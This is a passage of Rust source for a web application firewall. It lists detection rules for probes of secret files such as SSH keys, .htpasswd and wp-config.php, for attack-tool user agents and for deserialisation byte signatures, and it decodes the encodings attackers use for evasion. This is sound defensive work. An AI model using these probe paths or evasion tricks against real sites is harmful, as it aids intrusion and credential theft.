    RuleDef::path("PQW-PROBE-030", Severity::High,   r"(?i)(^|/)terraform\.tfstate"),
    RuleDef::path("PQW-PROBE-031", Severity::Medium, r"(?i)(^|/)\.terraform(/|$)"),
    RuleDef::path("PQW-PROBE-032", Severity::Medium, r"(?i)(^|/)docker-compose\.(yml|yaml)$"),
    RuleDef::path("PQW-PROBE-033", Severity::Medium, r"(?i)(^|/)Dockerfile$"),
    RuleDef::path("PQW-PROBE-034", Severity::Medium, r"(?i)(^|/)kubernetes\.(yml|yaml)$"),
    RuleDef::path("PQW-PROBE-035", Severity::Medium, r"(?i)(^|/)k8s\.(yml|yaml)$"),
    // WordPress / common CMS probes
    RuleDef::path("PQW-PROBE-040", Severity::Medium, r"(?i)(^|/)wp-login\.php$"),
    RuleDef::path("PQW-PROBE-041", Severity::Medium, r"(?i)(^|/)wp-admin(/|$)"),
    RuleDef::path("PQW-PROBE-042", Severity::Medium, r"(?i)(^|/)xmlrpc\.php$"),
    RuleDef::path("PQW-PROBE-043", Severity::High,   r"(?i)(^|/)wp-config\.php$"),
    RuleDef::path("PQW-PROBE-044", Severity::Medium, r"(?i)(^|/)wp-content/(plugins|themes)/.*\.php$"),
    // Database / backup files
    RuleDef::path("PQW-PROBE-050", Severity::High,   r"(?i)(^|/)database\.yml$"),
    RuleDef::path("PQW-PROBE-051", Severity::Medium, r"(?i)\.(sql|bak|backup|dump|tar\.gz|tgz|zip)$"),
    RuleDef::path("PQW-PROBE-052", Severity::High,   r"(?i)(^|/)dump\.rdb$"),
    // Web server config
    RuleDef::path("PQW-PROBE-060", Severity::Medium, r"(?i)(^|/)\.htaccess$"),
    RuleDef::path("PQW-PROBE-061", Severity::High,   r"(?i)(^|/)\.htpasswd$"),
    RuleDef::path("PQW-PROBE-062", Severity::Medium, r"(?i)(^|/)server-status(/|$)"),
    RuleDef::path("PQW-PROBE-063", Severity::Medium, r"(?i)(^|/)server-info(/|$)"),
    RuleDef::path("PQW-PROBE-064", Severity::Medium, r"(?i)(^|/)web\.config$"),
    RuleDef::path("PQW-PROBE-065", Severity::Medium, r"(?i)(^|/)cgi-bin/"),
    // SSH / credentials
    RuleDef::path("PQW-PROBE-070", Severity::High,   r"(?i)(^|/)\.ssh(/|$)"),
    RuleDef::path("PQW-PROBE-071", Severity::High,   r"(?i)(^|/)id_rsa$"),
    RuleDef::path("PQW-PROBE-072", Severity::High,   r"(?i)(^|/)id_ed25519$"),
    // Admin panels and framework debug surfaces
    RuleDef::path("PQW-PROBE-080", Severity::Medium, r"(?i)(^|/)(phpmyadmin|pma)(/|$)"),
    RuleDef::path("PQW-PROBE-081", Severity::Medium, r"(?i)(^|/)adminer\.php$"),
    RuleDef::path("PQW-PROBE-082", Severity::Medium, r"(?i)(^|/)actuator(/|$)"),
    RuleDef::path("PQW-PROBE-083", Severity::Medium, r"(?i)(^|/)_profiler(/|$)"),
    RuleDef::path("PQW-PROBE-084", Severity::Medium, r"(?i)(^|/)telescope/requests"),
    RuleDef::path("PQW-PROBE-085", Severity::Medium, r"(?i)(^|/)solr/"),
    RuleDef::path("PQW-PROBE-086", Severity::Medium, r"(?i)(^|/)(phpinfo|info)\.php$"),
    // Filesystem and editor artifacts
    RuleDef::path("PQW-PROBE-090", Severity::Medium, r"(?i)(^|/)\.DS_Store$"),
    RuleDef::path("PQW-PROBE-091", Severity::Medium, r"(?i)(^|/)\.(vscode|idea)(/|$)"),
    // Config dumps
    RuleDef::path("PQW-PROBE-100", Severity::Medium, r"(?i)(^|/)config\.(php|yml|yaml|json|ini|xml)$"),
    RuleDef::path("PQW-PROBE-101", Severity::Medium, r"(?i)(^|/)settings\.(php|yml|yaml|json|ini)$"),
    RuleDef::path("PQW-PROBE-102", Severity::Medium, r"(?i)(^|/)appsettings(\.[A-Za-z]+)?\.json$"),
    // Package manager manifests
    RuleDef::path("PQW-PROBE-110", Severity::Medium, r"(?i)(^|/)composer\.(json|lock)$"),
    RuleDef::path("PQW-PROBE-111", Severity::Medium, r"(?i)(^|/)package(-lock)?\.json$"),
    RuleDef::path("PQW-PROBE-112", Severity::Medium, r"(?i)(^|/)yarn\.lock$"),
    // CI/CD pipeline files
    RuleDef::path("PQW-PROBE-120", Severity::Medium, r"(?i)(^|/)\.github(/|$)"),
    RuleDef::path("PQW-PROBE-121", Severity::Medium, r"(?i)(^|/)\.gitlab-ci\.yml$"),
    RuleDef::path("PQW-PROBE-122", Severity::Medium, r"(?i)(^|/)Jenkinsfile$"),
    RuleDef::path("PQW-PROBE-123", Severity::Medium, r"(?i)(^|/)\.(travis\.yml|circleci)(/|$)?"),
];

/// Known malicious scanner/bot user-agents — matched against the User-Agent
/// header only.
///
/// These strings appear in automated security tools and are never sent by
/// browsers. Matching against UA specifically (rather than folding them into the
/// payload set) avoids false positives from a UA-shaped string appearing in a
/// referer or cookie.
#[rustfmt::skip]
const UA_RULES: &[RuleDef] = &[
    // Security scanners — exact tool names
    RuleDef::ua("PQW-BOT-001", Severity::High, r"(?i)\bsqlmap\b"),
    RuleDef::ua("PQW-BOT-002", Severity::High, r"(?i)\bnikto\b"),
    RuleDef::ua("PQW-BOT-003", Severity::High, r"(?i)\bmasscan(-ng)?\b"),
    RuleDef::ua("PQW-BOT-004", Severity::High, r"(?i)\bnmap\b"),
    RuleDef::ua("PQW-BOT-005", Severity::High, r"(?i)\bnuclei\b"),
    RuleDef::ua("PQW-BOT-006", Severity::High, r"(?i)\bzgrab\b"),
    RuleDef::ua("PQW-BOT-007", Severity::High, r"(?i)\bshodan\b"),
    RuleDef::ua("PQW-BOT-008", Severity::High, r"(?i)\bburp\s*suite\b|\bburpsuite\b"),
    RuleDef::ua("PQW-BOT-009", Severity::High, r"(?i)\bdirbuster\b"),
    RuleDef::ua("PQW-BOT-010", Severity::High, r"(?i)\bgobuster\b"),
    RuleDef::ua("PQW-BOT-011", Severity::High, r"(?i)\bferoxbuster\b"),
    RuleDef::ua("PQW-BOT-012", Severity::High, r"(?i)\bffuf\b"),
    RuleDef::ua("PQW-BOT-013", Severity::High, r"(?i)\bwfuzz\b"),
    RuleDef::ua("PQW-BOT-014", Severity::High, r"(?i)\bhavij\b"),
    RuleDef::ua("PQW-BOT-015", Severity::High, r"(?i)\bmetasploit\b"),
    RuleDef::ua("PQW-BOT-016", Severity::High, r"(?i)\bw3af\b"),
    RuleDef::ua("PQW-BOT-017", Severity::High, r"(?i)\bOpenVAS\b"),
    RuleDef::ua("PQW-BOT-018", Severity::High, r"(?i)\bNessus\b"),
    RuleDef::ua("PQW-BOT-019", Severity::High, r"(?i)\bAcunetix\b"),
    RuleDef::ua("PQW-BOT-020", Severity::High, r"(?i)\bAppScan\b"),
    RuleDef::ua("PQW-BOT-021", Severity::High, r"(?i)\bwpscan\b"),
    RuleDef::ua("PQW-BOT-022", Severity::High, r"(?i)\bjoomscan\b"),
    RuleDef::ua("PQW-BOT-023", Severity::High, r"(?i)\bZmEu\b"),
    RuleDef::ua("PQW-BOT-024", Severity::High, r"(?i)\b(thc-)?hydra\b"),
    RuleDef::ua("PQW-BOT-025", Severity::High, r"(?i)\bmedusa\b"),
    RuleDef::ua("PQW-BOT-026", Severity::High, r"(?i)\bjohn\b.*\bpassword\b"),
    // Added: tools that post-date the original list
    RuleDef::ua("PQW-BOT-027", Severity::High, r"(?i)\b(zaproxy|OWASP\s*ZAP)\b"),
    RuleDef::ua("PQW-BOT-028", Severity::High, r"(?i)\bdirsearch\b"),
    RuleDef::ua("PQW-BOT-029", Severity::High, r"(?i)\bxsstrike\b"),
    RuleDef::ua("PQW-BOT-030", Severity::High, r"(?i)\bcommix\b"),
    RuleDef::ua("PQW-BOT-031", Severity::High, r"(?i)\barachni\b"),
    RuleDef::ua("PQW-BOT-032", Severity::High, r"(?i)\bskipfish\b"),
    RuleDef::ua("PQW-BOT-033", Severity::High, r"(?i)\bwhatweb\b"),
    RuleDef::ua("PQW-BOT-034", Severity::High, r"(?i)\bnetsparker\b"),
    RuleDef::ua("PQW-BOT-035", Severity::High, r"(?i)\bqualys\b"),
    RuleDef::ua("PQW-BOT-036", Severity::High, r"(?i)\bcensys\b"),
    RuleDef::ua("PQW-BOT-037", Severity::High, r"(?i)\b(katana|subfinder|httpx)/"),
    RuleDef::ua("PQW-BOT-038", Severity::High, r"(?i)\bevilginx\b"),
    // Scripted HTTP clients and crawlers
    RuleDef::ua("PQW-BOT-050", Severity::High, r"(?i)\bhtttrack\b|\bhttrack\b"),
    RuleDef::ua("PQW-BOT-051", Severity::High, r"(?i)\bscrapy\b"),
    RuleDef::ua("PQW-BOT-052", Severity::High, r"(?i)\blibwww-perl\b"),
    RuleDef::ua("PQW-BOT-053", Severity::High, r"(?i)\bperl\b.*\blibwww\b"),
    RuleDef::ua("PQW-BOT-054", Severity::High, r"(?i)\bpython-urllib/[0-9]"),
    RuleDef::ua("PQW-BOT-055", Severity::High, r"(?i)\bpython-requests/[0-9]"),
    RuleDef::ua("PQW-BOT-056", Severity::High, r"(?i)\bGo-http-client/[0-9]"),
    RuleDef::ua("PQW-BOT-057", Severity::High, r"(?i)^curl/[0-9]"),
    RuleDef::ua("PQW-BOT-058", Severity::High, r"(?i)^Wget/[0-9]"),
    RuleDef::ua("PQW-BOT-059", Severity::High, r"(?i)^Java/[0-9]"),
    // Headless browsers and drivers
    RuleDef::ua("PQW-BOT-070", Severity::High, r"(?i)\bHeadlessChrome\b"),
    RuleDef::ua("PQW-BOT-071", Severity::High, r"(?i)\bPhantomJS\b"),
    RuleDef::ua("PQW-BOT-072", Severity::High, r"(?i)\bSlimerJS\b"),
    RuleDef::ua("PQW-BOT-073", Severity::High, r"(?i)\bCasperJS\b"),
    RuleDef::ua("PQW-BOT-074", Severity::High, r"(?i)\bselenium\b"),
    RuleDef::ua("PQW-BOT-075", Severity::High, r"(?i)\bwebdriver\b"),
    RuleDef::ua("PQW-BOT-076", Severity::High, r"(?i)\bplaywright\b"),
    RuleDef::ua("PQW-BOT-077", Severity::High, r"(?i)\bpuppeteer\b"),
];

/// Byte-signature rules for request bodies that are not valid UTF-8.
///
/// The regex engine works on `&str`; a Java serialised object is binary, so the
/// `\xac\xed\x00\x05` header could never match a decoded body no matter how the
/// decoding was done. These run against the raw bytes instead.
const BYTE_SIGNATURES: &[(&str, Severity, &[u8])] = &[
    // Java object serialisation stream header: STREAM_MAGIC + STREAM_VERSION
    (
        "PQW-DESER-100",
        Severity::Critical,
        &[0xAC, 0xED, 0x00, 0x05],
    ),
    // Python pickle protocol 2+ opcode sequence: PROTO <n> ... STOP
    ("PQW-DESER-101", Severity::High, &[0x80, 0x04, 0x95]),
    ("PQW-DESER-102", Severity::High, &[0x80, 0x02, 0x63]),
];

/// Structural (non-regex) request anomalies. Identifiers are reserved here so
/// they participate in exclusions and metrics like any other rule.
const ANOMALY_RULES: &[(&str, Severity, &str)] = &[
    (
        "PQW-ANOM-001",
        Severity::Critical,
        "conflicting Content-Length headers",
    ),
    (
        "PQW-ANOM-002",
        Severity::Critical,
        "Content-Length with Transfer-Encoding",
    ),
    (
        "PQW-ANOM-003",
        Severity::High,
        "malformed Transfer-Encoding value",
    ),
    (
        "PQW-ANOM-004",
        Severity::High,
        "control character in header value",
    ),
    ("PQW-ANOM-005", Severity::Medium, "diagnostic HTTP method"),
    ("PQW-ANOM-006", Severity::Medium, "excessive header count"),
    ("PQW-ANOM-007", Severity::High, "malformed Host header"),
    ("PQW-ANOM-008", Severity::Medium, "duplicate Host header"),
];

/// Rules for the presence/absence of a User-Agent, kept out of [`UA_RULES`]
/// because they are decided by inspection of the header map rather than by a
/// pattern over a value.
const UA_META_RULES: &[(&str, Severity)] = &[
    ("PQW-BOT-900", Severity::Medium), // no User-Agent header at all
    ("PQW-BOT-901", Severity::Medium), // User-Agent present but blank
];

/// Headers never scanned: content negotiation, cache validators, client hints
/// and credentials. Scanning them costs cycles on every request and buys
/// nothing — none of them reaches an interpreter, and `authorization` carries
/// opaque high-entropy tokens that only generate noise.
const HEADERS_NEVER_SCANNED: &[&str] = &[
    "accept",
    "accept-encoding",
    "accept-language",
    "accept-charset",
    "accept-datetime",
    "authorization",
    "proxy-authorization",
    "cache-control",
    "connection",
    "content-length",
    "date",
    "dnt",
    "if-match",
    "if-modified-since",
    "if-none-match",
    "if-range",
    "if-unmodified-since",
    "keep-alive",
    "pragma",
    "priority",
    "range",
    "sec-ch-ua",
    "sec-ch-ua-mobile",
    "sec-ch-ua-platform",
    "sec-fetch-dest",
    "sec-fetch-mode",
    "sec-fetch-site",
    "sec-fetch-user",
    "te",
    "upgrade-insecure-requests",
];

/// Headers exempt from SSRF rules. Proxy hop headers carry private and loopback
/// addresses by design — that is what they are for — so applying SSRF patterns
/// to them fires on every request that passed through a local reverse proxy.
const HEADERS_SSRF_EXEMPT: &[&str] = &[
    "x-forwarded-for",
    "x-forwarded-host",
    "x-forwarded-server",
    "x-real-ip",
    "x-client-ip",
    "cf-connecting-ip",
    "true-client-ip",
    "forwarded",
    "via",
];

// ============================================================================
// Decoding
// ============================================================================

/// Percent-decode repeatedly until the string stops changing or `max_passes` is
/// reached.
///
/// A single decode pass is a bypass: `%253Cscript%253E` decodes once to
/// `%3Cscript%3E`, which matches nothing, and the origin decodes it a second
/// time. Lossy decoding is deliberate — an attacker who appends invalid UTF-8
/// must not be able to make the decoded form unavailable for inspection.
fn percent_decode_iterative(input: &str, max_passes: usize) -> String {
    let mut current = input.to_string();
    for _ in 0..max_passes {
        let next = percent_decode_str(&current)
            .decode_utf8_lossy()
            .into_owned();
        if next == current {
            break;
        }
        current = next;
    }
    current
}

/// Decode HTML character references (`&#60;`, `&#x3c;`, `&lt;`).
///
/// Payloads reflected into an HTML context are frequently submitted entity-
/// encoded so the raw form never contains a `<`.
fn html_entity_decode(input: &str) -> String {
    if !input.contains('&') {
        return input.to_string();
    }
    let mut out = String::with_capacity(input.len());
    let bytes = input.as_bytes();
    let mut i = 0;
    while i < bytes.len() {
        if bytes[i] != b'&' {
            // Copy this character whole; indexing by byte would split UTF-8.
            let ch = input[i..].chars().next().unwrap_or('\u{fffd}');
            out.push(ch);
            i += ch.len_utf8();
            continue;
        }
        // Bounded lookahead: the longest reference we decode is "&#x10FFFF;".
        let end = bytes
            .iter()
            .skip(i + 1)
            .take(10)
            .position(|&b| b == b';')
            .map(|p| i + 1 + p);
        let Some(end) = end else {
            out.push('&');
            i += 1;
            continue;
        };
        let body = &input[i + 1..end];
        let decoded = if let Some(hex) = body.strip_prefix("#x").or_else(|| body.strip_prefix("#X"))
        {
            u32::from_str_radix(hex, 16).ok().and_then(char::from_u32)
        } else if let Some(dec) = body.strip_prefix('#') {
            dec.parse::<u32>().ok().and_then(char::from_u32)
        } else {
            match body.to_ascii_lowercase().as_str() {
                "lt" => Some('<'),
                "gt" => Some('>'),
                "quot" => Some('"'),
                "apos" => Some('\''),
                "amp" => Some('&'),
                "colon" => Some(':'),
                "lpar" => Some('('),
                "rpar" => Some(')'),
                "sol" => Some('/'),
                "newline" | "NewLine" => Some('\n'),
                "tab" => Some('\t'),
                _ => None,
            }
        };
        match decoded {
            Some(c) => {
                out.push(c);
                i = end + 1;
            }
            None => {
                out.push('&');
                i += 1;
            }
        }
    }
    out
}

/// Decode JSON string escapes, principally `\uXXXX`.
///
/// `scan_json_body` used to mean nothing more than "scan the body as text", so
/// `{"q":"<script>"}` passed inspection and arrived at the origin as
/// `<script>`.
fn json_unescape(input: &str) -> String {
    if !input.contains('\\') {
        return input.to_string();
    }
    let mut out = String::with_capacity(input.len());
    let mut chars = input.chars().peekable();
    while let Some(c) = chars.next() {
        if c != '\\' {
            out.push(c);
            continue;
        }
        match chars.next() {
            Some('u') => {
                let hex: String = (0..4).filter_map(|_| chars.next()).collect();
                match u32::from_str_radix(&hex, 16) {
                    Ok(cp @ 0xD800..=0xDBFF) => {
                        // High surrogate — try to pair it with the low half.
                        let mut lookahead = chars.clone();
                        let paired = (lookahead.next() == Some('\\')
                            && lookahead.next() == Some('u'))
                        .then(|| {
                            let low: String = (0..4).filter_map(|_| lookahead.next()).collect();
                            u32::from_str_radix(&low, 16).ok()
                        })
                        .flatten()
                        .filter(|lo| (0xDC00..=0xDFFF).contains(lo));
                        match paired {
                            Some(lo) => {
                                chars = lookahead;
                                let combined = 0x10000 + ((cp - 0xD800) << 10) + (lo - 0xDC00);
                                out.push(char::from_u32(combined).unwrap_or('\u{fffd}'));
                            }
                            None => out.push('\u{fffd}'),
                        }
                    }
                    Ok(cp) => out.push(char::from_u32(cp).unwrap_or('\u{fffd}')),
                    Err(_) => {
                        out.push('\\');
                        out.push('u');
                        out.push_str(&hex);
                    }
                }
            }
            Some('n') => out.push('\n'),
            Some('r') => out.push('\r'),
            Some('t') => out.push('\t'),
            Some('b') => out.push('\u{8}'),
            Some('f') => out.push('\u{c}'),
            Some(other) => out.push(other),
            None => out.push('\\'),
        }
    }
    out
}

/// Truncate to at most `max` bytes without splitting a UTF-8 character.
fn truncate_on_char_boundary(s: &str, max: usize) -> &str {
    if s.len() <= max {
        return s;
    }
    let mut end = max;
    while end > 0 && !s.is_char_boundary(end) {
        end -= 1;
    }
    &s[..end]
}

/// Every decoded form of one input that should be inspected.
///
/// The raw form is always first; the rest are added only when they differ, so a
/// header with no encoding at all costs exactly one scan.
/// Decode IIS-style `%uXXXX` escapes.
///
/// Non-standard, but IIS and a handful of application stacks accept it, so a
/// payload written `%u003cscript%u003e` reaches such a backend as `<script>`
/// while surviving ordinary percent-decoding untouched (`%u` is not valid
/// percent-encoding, so the earlier pass leaves it alone).
fn percent_u_decode(input: &str) -> String {
    if !input.contains("%u") && !input.contains("%U") {
        return input.to_string();
    }
    let bytes = input.as_bytes();
    let mut out = String::with_capacity(input.len());
    let mut i = 0;
    while i < bytes.len() {
        if (bytes[i] == b'%')
            && i + 5 < bytes.len()
            && (bytes[i + 1] | 0x20) == b'u'
            && bytes[i + 2..i + 6].iter().all(u8::is_ascii_hexdigit)
        {
            if let Some(c) = u32::from_str_radix(&input[i + 2..i + 6], 16)
                .ok()
                .and_then(char::from_u32)
            {
                out.push(c);
                i += 6;
                continue;
            }
        }
        let ch = input[i..].chars().next().unwrap_or('\u{fffd}');
        out.push(ch);
        i += ch.len_utf8();
    }
    out
}

/// Fold Unicode fullwidth Latin forms to their ASCII equivalents.
///
/// Fullwidth Latin (U+FF01..U+FF5E) renders like ASCII and several backends
/// normalise it before use, so a fullwidth `<script>` is `<script>` to them.
/// Folding it here lets the ASCII rules match without every rule having to
/// enumerate the fullwidth codepoints.
fn fold_fullwidth(input: &str) -> String {
    if input.is_ascii() {
        return input.to_string();
    }
    input
        .chars()
        .map(|c| match c {
            '\u{ff01}'..='\u{ff5e}' => char::from_u32(c as u32 - 0xFEE0).unwrap_or(c),
            '\u{3000}' => ' ', // ideographic space
            _ => c,
        })
        .collect()
}

fn decode_variants(raw: &str, max_passes: usize) -> Vec<String> {
    let mut out: Vec<String> = Vec::with_capacity(4);
    out.push(raw.to_string());

    let add = |candidate: String, out: &mut Vec<String>| {
        if !candidate.is_empty() && !out.contains(&candidate) {
            out.push(candidate);
        }
    };

    let pct = percent_decode_iterative(raw, max_passes);
    add(pct.clone(), &mut out);

    if raw.contains('+') {
        add(
            percent_decode_iterative(&raw.replace('+', " "), max_passes),
            &mut out,
        );
    }
    add(html_entity_decode(&pct), &mut out);
    add(json_unescape(&pct), &mut out);
    if pct.contains('%') {
        add(percent_u_decode(&pct), &mut out);
    }
    if !pct.is_ascii() {
        add(fold_fullwidth(&pct), &mut out);
    }

    out
}

// ============================================================================
// Engine
// ============================================================================

/// WAF decision for a request
#[derive(Debug, Clone)]
pub enum WafVerdict {
    /// Request passes WAF checks
    Allow,
    /// Suspicious but allowed in detect mode — log only
    Detect {
        rule: String,
        severity: Severity,
        /// Accumulated anomaly score
        score: u32,
        /// How many distinct rules matched
        matched: u32,
    },
    /// Request blocked
    Block {
        rule: String,
        severity: Severity,
        score: u32,
        matched: u32,
    },
}

/// Incoming request data for WAF inspection
pub struct WafRequest<'a> {
    pub method: &'a str,
    pub path: &'a str,
    pub query: &'a str,
    pub headers: &'a HeaderMap,
    /// Request body bytes (already limited to `max_body_scan_bytes`)
    pub body: Option<&'a [u8]>,
    /// Skip bot UA pattern check (set true for routes that allow automated clients)
    pub skip_bot_ua_check: bool,
    /// Per-route override of `waf.mode` ("block" | "detect"). None uses the
    /// global mode. Lets one route be tuned in detect mode while the rest of
    /// the site stays blocking.
    pub mode_override: Option<&'a str>,
}

/// A rule as compiled into the engine, addressed by its index in
/// [`WafEngine::rules`].
struct CompiledRule {
    id: String,
    category: Category,
    severity: Severity,
}

/// A `[[waf.exclusions]]` entry with its path pattern compiled.
struct CompiledExclusion {
    path: Regex,
    rules: Vec<String>,
    categories: Vec<String>,
}

/// Per-rule and per-verdict counters.
///
/// Held inside the engine rather than in `MetricsRegistry` because the WAF is
/// built from config inside `SecurityState`, which has no metrics handle; the
/// admin metrics endpoint reads them back through `SecurityState::waf_engine`.
#[derive(Debug)]
pub struct WafStats {
    inspected: AtomicU64,
    allowed: AtomicU64,
    blocked: AtomicU64,
    detected: AtomicU64,
    per_rule: Vec<AtomicU64>,
}

impl WafStats {
    fn new(rule_count: usize) -> Self {
        Self {
            inspected: AtomicU64::new(0),
            allowed: AtomicU64::new(0),
            blocked: AtomicU64::new(0),
            detected: AtomicU64::new(0),
            per_rule: (0..rule_count).map(|_| AtomicU64::new(0)).collect(),
        }
    }
}

/// One rule's hit count, for export.
#[derive(Debug, Clone)]
pub struct WafRuleStat {
    pub id: String,
    pub category: &'static str,
    pub severity: &'static str,
    pub hits: u64,
}

/// Point-in-time view of the WAF counters.
#[derive(Debug, Clone)]
pub struct WafStatsSnapshot {
    pub inspected: u64,
    pub allowed: u64,
    pub blocked: u64,
    pub detected: u64,
    /// Rules that have matched at least once. Rules with no hits are omitted so
    /// the metric does not carry ~250 permanently-zero series.
    pub rules: Vec<WafRuleStat>,
}

/// Compiled WAF engine
pub struct WafEngine {
    /// Metadata for every rule, in a stable order: payload, path, user-agent,
    /// user-agent presence, byte signatures, anomalies, then custom patterns.
    rules: Vec<CompiledRule>,
    /// Payload-scope patterns, and the global rule index for each set member.
    payload_set: RegexSet,
    payload_map: Vec<usize>,
    path_set: RegexSet,
    path_map: Vec<usize>,
    ua_set: RegexSet,
    ua_map: Vec<usize>,
    /// Global index of the first entry of each fixed block.
    ua_meta_base: usize,
    byte_sig_base: usize,
    anomaly_base: usize,
    exclusions: Vec<CompiledExclusion>,
    stats: WafStats,
    config: WafConfig,
}

/// Running tally for one request.
#[derive(Default)]
struct Assessment {
    /// Accumulated anomaly score.
    score: u32,
    /// Distinct rules matched.
    matched: u32,
    /// Global index of the highest-severity rule matched — the one reported.
    top: Option<usize>,
    top_severity: Option<Severity>,
    /// Rules already counted, so the same rule matching in several decoded
    /// forms of one input contributes its score once.
    seen: Vec<usize>,
}

impl WafEngine {
    /// Build a new WAF engine from config, compiling all patterns at construction time.
    #[allow(clippy::new_without_default)]
    pub fn new(config: &WafConfig) -> Self {
        let mut rules: Vec<CompiledRule> = Vec::new();
        let mut payload_pats: Vec<&str> = Vec::new();
        let mut payload_map: Vec<usize> = Vec::new();
        let mut path_pats: Vec<&str> = Vec::new();
        let mut path_map: Vec<usize> = Vec::new();
        let mut ua_pats: Vec<&str> = Vec::new();
        let mut ua_map: Vec<usize> = Vec::new();

        for def in PAYLOAD_RULES.iter().chain(PATH_RULES).chain(UA_RULES) {
            let idx = rules.len();
            rules.push(CompiledRule {
                id: def.id.to_string(),
                category: def.category,
                severity: def.severity,
            });
            // A disabled category keeps its metadata slot — so rule indices and
            // therefore metric series stay stable across config changes — but
            // contributes no pattern to match against.
            if !def.category.enabled(config) {
                continue;
            }
            match def.scope {
                Scope::Payload => push_pattern(
                    def.pattern,
                    idx,
                    &mut payload_pats,
                    &mut payload_map,
                    def.id,
                ),
                Scope::Path => {
                    push_pattern(def.pattern, idx, &mut path_pats, &mut path_map, def.id);
                }
                Scope::UserAgent => {
                    push_pattern(def.pattern, idx, &mut ua_pats, &mut ua_map, def.id);
                }
            }
        }

        let ua_meta_base = rules.len();
        for (id, severity) in UA_META_RULES {
            rules.push(CompiledRule {
                id: (*id).to_string(),
                category: Category::BadBotUa,
                severity: *severity,
            });
        }

        let byte_sig_base = rules.len();
        for (id, severity, _) in BYTE_SIGNATURES {
            rules.push(CompiledRule {
                id: (*id).to_string(),
                category: Category::Deserialization,
                severity: *severity,
            });
        }

        let anomaly_base = rules.len();
        for (id, severity, _) in ANOMALY_RULES {
            rules.push(CompiledRule {
                id: (*id).to_string(),
                category: Category::Anomaly,
                severity: *severity,
            });
        }

        // Custom operator patterns are appended last so that adding one cannot
        // renumber a built-in rule.
        for (n, pattern) in config.custom_patterns.iter().enumerate() {
            let id = format!("PQW-CUSTOM-{:03}", n + 1);
            let idx = rules.len();
            let before = payload_map.len();
            push_pattern(pattern, idx, &mut payload_pats, &mut payload_map, &id);
            if payload_map.len() > before {
                rules.push(CompiledRule {
                    id,
                    category: Category::Custom,
                    severity: Severity::High,
                });
            }
        }

        let payload_set = build_set(&payload_pats, "payload");
        let path_set = build_set(&path_pats, "path");
        let ua_set = build_set(&ua_pats, "user-agent");

        let exclusions = config
            .exclusions
            .iter()
            .filter_map(|e| match Regex::new(&e.path) {
                Ok(path) => Some(CompiledExclusion {
                    path,
                    rules: e.rules.clone(),
                    categories: e.categories.clone(),
                }),
                Err(err) => {
                    tracing::warn!("Invalid waf.exclusions path pattern '{}': {}", e.path, err);
                    None
                }
            })
            .collect();

        let stats = WafStats::new(rules.len());

        tracing::info!(
            "WAF engine compiled: {} rules ({} payload, {} path, {} user-agent), threshold {}, mode {}",
            rules.len(),
            payload_set.len(),
            path_set.len(),
            ua_set.len(),
            config.anomaly_threshold,
            config.mode,
        );

        Self {
            rules,
            payload_set,
            payload_map,
            path_set,
            path_map,
            ua_set,
            ua_map,
            ua_meta_base,
            byte_sig_base,
            anomaly_base,
            exclusions,
            stats,
            config: config.clone(),
        }
    }

    /// Counters for the metrics endpoint.
    pub fn stats(&self) -> WafStatsSnapshot {
        let rules = self
            .stats
            .per_rule
            .iter()
            .enumerate()
            .filter_map(|(i, c)| {
                let hits = c.load(Ordering::Relaxed);
                (hits > 0).then(|| WafRuleStat {
                    id: self.rules[i].id.clone(),
                    category: self.rules[i].category.as_str(),
                    severity: self.rules[i].severity.as_str(),
                    hits,
                })
            })
            .collect();
        WafStatsSnapshot {
            inspected: self.stats.inspected.load(Ordering::Relaxed),
            allowed: self.stats.allowed.load(Ordering::Relaxed),
            blocked: self.stats.blocked.load(Ordering::Relaxed),
            detected: self.stats.detected.load(Ordering::Relaxed),
            rules,
        }
    }

    /// Number of compiled rules, including disabled categories.
    pub fn rule_count(&self) -> usize {
        self.rules.len()
    }
}

/// Compile a validated pattern list into a `RegexSet`.
///
/// Patterns reaching here have already been accepted by `Regex::new` in
/// [`push_pattern`], so the only remaining failure is the set exceeding the
/// compiled-program size limit; the limit is raised well past what this ruleset
/// needs, and a failure is loud rather than silent.
/// Decompress a request body far enough to inspect it, capped at `max_out`
/// bytes so a compression bomb cannot exhaust memory.
///
/// Returns `None` for an unrecognised or `identity` encoding, or when
/// decompression fails (malformed stream) — the caller then relies on the raw
/// scan. Only the first token of a comma-separated `Content-Encoding` list is
/// honoured, which is what matters for the common single-encoding case; a
/// multi-layer encoding falls through to the raw scan rather than being
/// recursively unwrapped.
fn decompress_bounded(body: &[u8], encoding: &str, max_out: usize) -> Option<Vec<u8>> {
    use std::io::Read;

    let enc = encoding
        .split(',')
        .next()
        .unwrap_or("")
        .trim()
        .to_ascii_lowercase();

    // A bounded reader over the input, decoded by the matching decoder, read
    // through a `take(max_out)` limiter so output can never exceed the cap.
    let mut out = Vec::new();
    let limit = max_out as u64;
    let result = match enc.as_str() {
        "gzip" | "x-gzip" => flate2::read::GzDecoder::new(body)
            .take(limit)
            .read_to_end(&mut out),
        "deflate" | "x-deflate" => flate2::read::ZlibDecoder::new(body)
            .take(limit)
            .read_to_end(&mut out),
        "br" => brotli::Decompressor::new(body, 4096)
            .take(limit)
            .read_to_end(&mut out),
        "zstd" => match zstd::stream::read::Decoder::new(body) {
            Ok(d) => d.take(limit).read_to_end(&mut out),
            Err(e) => Err(e),
        },
        _ => return None, // identity / unknown — nothing to do
    };

    match result {
        // A clean EOF, or a stream that filled the cap (which read_to_end sees
        // as EOF on the limited reader): inspect what we have either way.
        Ok(_) => Some(out),
        // Truncated/corrupt stream: keep whatever decoded before the error, so a
        // deliberately-broken tail cannot hide a payload in the good prefix.
        Err(_) if !out.is_empty() => Some(out),
        Err(_) => None,
    }
}

fn build_set(patterns: &[&str], scope: &str) -> RegexSet {
    RegexSetBuilder::new(patterns)
        .size_limit(32 * 1024 * 1024)
        .build()
        .unwrap_or_else(|e| {
            tracing::error!(
                "WAF {} rule set failed to compile ({}) — this scope will not match anything",
                scope,
                e
            );
            RegexSet::empty()
        })
}

/// Push a pattern into a scope's parallel `(patterns, rule index)` arrays,
/// rejecting it if it does not compile.
///
/// Validating here rather than at set-build time is what keeps the arrays in
/// step: a pattern dropped later would shift every subsequent set index off its
/// rule and mislabel every match after it.
fn push_pattern<'a>(
    pattern: &'a str,
    rule_idx: usize,
    pats: &mut Vec<&'a str>,
    map: &mut Vec<usize>,
    id: &str,
) {
    match Regex::new(pattern) {
        Ok(_) => {
            pats.push(pattern);
            map.push(rule_idx);
        }
        Err(e) => tracing::error!("WAF rule {} failed to compile: {}", id, e),
    }
}

/// Which categories a particular target is allowed to trigger.
///
/// Two categories are meaningful in some places and pure noise in others:
/// SSRF patterns describe exactly what a proxy hop header legitimately
